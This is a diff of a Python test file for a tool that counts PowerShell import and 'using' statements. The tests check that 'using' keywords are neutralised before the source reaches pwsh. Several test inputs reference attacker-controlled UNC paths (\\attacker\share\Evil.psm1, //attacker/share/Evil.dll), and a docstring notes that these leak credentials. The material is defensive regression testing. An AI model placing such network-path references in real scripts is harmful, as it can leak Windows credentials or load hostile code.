@@ -2,6 +2,7 @@
 
 import importlib.util
 import json
+import re
 import shutil
 import subprocess
 import sys
@@ -85,6 +86,8 @@ def test_powershell_suffixes_are_detected(suffix: str) -> None:
         "$m = Import-Module Pester -PassThru",
         "if ($true) { Import-Module Pester }",
         "using module ./Local.psm1",
+        "USING Module ./Local.psm1",
+        "UsInG namespace System.Text",
         "using module Pester",
         "using namespace System.Text",
         "using assembly System.Xml",
@@ -253,23 +256,6 @@ def test_broken_parser_results_fail_closed(
     assert message in str(excinfo.value)
 
 
-def test_resolution_errors_alone_keep_the_count(monkeypatch: pytest.MonkeyPatch) -> None:
-    stdout = json.dumps(
-        {
-            "count": 2,
-            "errors": [
-                {"id": "ModuleNotFoundDuringParse", "line": 1, "message": "not found"},
-                {"id": "ErrorLoadingAssembly", "line": 2, "message": "cannot load"},
-            ],
-        }
-    )
-    _fake_pwsh(monkeypatch, stdout=stdout)
-
-    coupling = assess_content(Path("Script.ps1"), "using module X\nusing assembly Y\n").coupling
-
-    assert coupling.reasons[0] == "2 import/dependency statements"
-
-
 def test_source_travels_on_stdin_from_an_empty_directory(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
@@ -417,43 +403,48 @@ def test_windows_requires_pwsh_exe(monkeypatch: pytest.MonkeyPatch) -> None:
     assert calls == []
 
 
+def test_pwsh_never_receives_a_using_keyword(monkeypatch: pytest.MonkeyPatch) -> None:
+    """CWE-829: no using statement reaches pwsh, so it cannot resolve a UNC or local target."""
+    import base64
+
+    calls = _fake_pwsh(monkeypatch, stdout='{"count":2,"errors":[]}')
+    source = (
+        "using module \\\\attacker\\share\\Evil.psm1\n"
+        "USING assembly //attacker/share/Evil.dll\n"
+        "Write-Host $using:Name 'Housing'\n"
+    )
+
+    assess_content(Path("Script.ps1"), source)
+
+    (call,) = calls
+    sent = base64.b64decode(call["input"]).decode("utf-8")
+    residue = sent.replace(_mod._PWSH_USING_SENTINEL, "")
+    assert re.search("using", residue, re.IGNORECASE | re.ASCII) is None
+    assert sent.count("\n") == source.count("\n")
+    assert sent.count(_mod._PWSH_USING_SENTINEL) == 4
+
+
+def test_neutralized_source_resolves_no_module_or_assembly() -> None:
+    """Without the rewrite, pwsh reports ErrorLoadingAssembly and ModuleNotFoundDuringParse."""
+    require_working_pwsh()
+    source = "using assembly NoSuch.Assembly.Issue7437\nusing module NoSuchModuleIssue7437\n"
+
+    result = _mod._run_pwsh_counter(source)
+
+    assert result["errors"] == []
+    assert result["count"] == 2
+
+
 @pytest.mark.parametrize(
     "source",
     [
-        "using module \\\\attacker\\share\\Evil.psm1\n",
-        "using assembly //attacker/share/Evil.dll\n",
-        "using module @{ ModuleName = '\\\\attacker\\share\\Evil.psd1'; ModuleVersion = '1.0' }\n",
+        "& 'using' module Pester",
+        ". using module Pester",
+        "Write-Output using module Pester",
+        "using",
     ],
 )
-def test_windows_refuses_using_with_a_network_path(
-    monkeypatch: pytest.MonkeyPatch, source: str
-) -> None:
-    """CWE-829: PowerShell resolves using targets while parsing; a UNC target leaks credentials."""
-    calls = _fake_pwsh(monkeypatch)
-    monkeypatch.setattr(sys, "platform", "win32")
+def test_using_text_that_is_not_a_using_statement_does_not_count(source: str) -> None:
+    coupling = _coupling(f"{source}\n")
 
-    with pytest.raises(_mod.PowerShellParserError, match="network path"):
-        assess_content(Path("Script.ps1"), source)
-
-    assert calls == []
-
-
-@pytest.mark.parametrize(
-    ("platform", "source"),
-    [
-        ("win32", "Copy-Item \\\\server\\share\\a.txt .\nImport-Module A\n"),
-        ("win32", "using module ./Local.psm1\nusing namespace System.Text\n"),
-        ("linux", "using module //host/share/Evil.psm1\n"),
-    ],
-)
-def test_network_guard_leaves_other_sources_to_the_parser(
-    monkeypatch: pytest.MonkeyPatch, platform: str, source: str
-) -> None:
-    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
-    monkeypatch.setattr(shutil, "which", lambda _name, path=None: "/fake/pwsh.exe")
-    monkeypatch.setattr(sys, "platform", platform)
-
-    coupling = assess_content(Path("Script.ps1"), source).coupling
-
-    assert coupling.reasons[0] == "1 import/dependency statements"
-    assert len(calls) == 1
+    assert coupling.reasons[0] == "0 import/dependency statements"
